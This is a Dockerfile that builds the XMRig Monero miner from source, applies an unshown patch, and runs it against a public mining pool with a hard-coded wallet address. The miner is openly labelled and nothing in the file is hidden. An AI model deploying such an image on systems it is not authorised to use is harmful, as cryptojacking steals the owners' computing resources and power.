FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.3.2'

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
# Configuration variables.
ENV POOL_URL=pool.supportxmr.com:443
ENV POOL_USER=47fdGMzG5mPSJQngP7prbZAd89HMjg2RdLipZgTBvKcpe1TiNKHsdMDcBJbNxhjqiuLbGAFhAhpGF7RGfYRVTybvJBPDRmf
ENV POOL_PW=Docker-xmrig-tls

RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

#ENTRYPOINT ["./xmrig"]
#CMD ["--url=pool.supportxmr.com:5555", "--user=8BszDYwfJGYTR9Fr8dS9Cq6c9bXm8N5y49SXNFUfMRkSeiAUgYtcHhFNztqHV9HKRnZViiFb9EUHuDZMfbZVFQhiKbGKvTs", "--pass=Docker", "-k", "--coin=monero"]
CMD ./xmrig -o ${POOL_URL} -u ${POOL_USER} -p ${POOL_PW} -k --coin=monero --tls
